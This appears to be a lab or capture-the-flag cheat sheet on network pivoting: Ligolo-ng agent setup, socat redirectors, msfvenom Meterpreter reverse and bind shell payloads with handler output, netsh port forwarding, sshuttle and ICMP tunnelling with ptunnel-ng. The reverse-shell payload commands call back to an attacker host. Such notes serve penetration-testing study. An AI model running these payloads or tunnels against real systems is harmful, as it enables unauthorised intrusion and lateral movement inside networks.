# Ligolo-ng

## Download Proxy and Agent

https://github.com/nicocha30/ligolo-ng/releases

## Setting Up

@attacker

```bash
sudo ligolo-ng -selfcert
```

@pivot

```bash
 ./agent -connect 10.10.16.50:11601 --ignore-cert
```


@attacker

```bash
ligolo-ng » session_list
┌─────────────────────────────────────────────────────────────────────────────┐
│ Active sessions and tunnels                                                 │
├───┬────────────────────────────────────────────────────┬───────────┬────────┤
│ # │ AGENT                                              │ INTERFACE │ STATUS │
├───┼────────────────────────────────────────────────────┼───────────┼────────┤
│ 1 │ jbetty@DMZ01 - 10.129.198.169:39368 - 0050568a2370 │           │ Online │
└───┴────────────────────────────────────────────────────┴───────────┴────────┘

ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.198.169:39368 - 0050568a2370
[Agent : jbetty@DMZ01] »
```

Once the session is specified, use the `autoroute` command on the `ligolo-ng` terminal and select the route, create new interface, and start the tunnel.

```bash
[Agent : jbetty@DMZ01] » autoroute
? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
INFO[0329] Generating a random interface name...
INFO[0329] Using interface name closeelectra
INFO[0329] Creating routes for closeelectra...
? Start the tunnel? Yes
INFO[0358] Starting tunnel to jbetty@DMZ01 (0050568a2370)
```

# Socat Redirection with a Revershe Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

## Socat Redirector

Example :

```bash
$ socat TCP4-LISTEN:8080,fork TCP4:10.10.16.50:4444
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our `attack host` (10.10.14.18).

## Windows Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=8080 -f exe -o rev.exe
```

## Meterpreter Multi/handler

```bash
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost tun0
lhost => 10.10.16.50
```

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
# Socat Redirection with a Bind Shell

![](images/Pasted%20image%2020260103110729.png)

## Create Listener Windows Payload (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o listener.exe LPORT=8443
```

## Create Socat Redirection on Pivot Host

```bash
ubuntu@WEB01:~$ sudo socat TCP-LISTEN:8000,fork TCP4:172.16.5.19:8443
```

## Start Meterpreter to connect to windows listener

```bash
msf exploit(multi/handler) > options

Payload options (aa

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '
                                        ', seh, thread, process, no
                                        ne)
   LPORT     8000             yes       The listen port
   RHOST     10.129.202.64    no        The target address

msf exploit(multi/handler) > run
[*] Started bind TCP handler against 10.129.202.64:8000
[*] Sending stage (230982 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.16.50:38369 -> 10.129.202.64:8000) at 2026-01-03 11:07:01 +0700

meterpreter > sysinfo
```

# Port Forwarding with Netsh (Windows)

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

![](images/Pasted%20image%2020260105144108.png)

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

```powershell
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

```powershell
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389
```

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the `8080` port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by `netsh.exe`.

# SSH Pivoting with Sshuttle

To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

```bash
$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

Starting sshuttle proxy (version 1.1.0).
c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/loca
```

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

# ICMP Tunneling with SOCKS

## Start ptunnel-ng Server on target

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

 -r --remote-addr
        Set remote proxy destination address if client
        Restrict to only this destination address if server
            (default: 127.0.0.1)
-R --remote-port
        Set remote proxy destination port if client
        Restrict to only this destination port if server
            (default: 22)


## Connecting to ptunnel-ng Server from Attack Host

```bash
sudo ./src/ptunnel-ng -p10.129.101.17 -l2222 -r10.129.101.17 -R22
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

-l --listen
        Set TCP listening port (only used when operating in forward mode)
            (default: 2222)
-p --proxy
        Set address of peer running packet forwarder. This causes
        ptunnel to operate in forwarding mode (Client) - the absence of this
        option causes ptunnel to operate in proxy mode (Server).

## Tunneling an SSH connection through an ICMP Tunnel

```bash
$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

```bash
$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

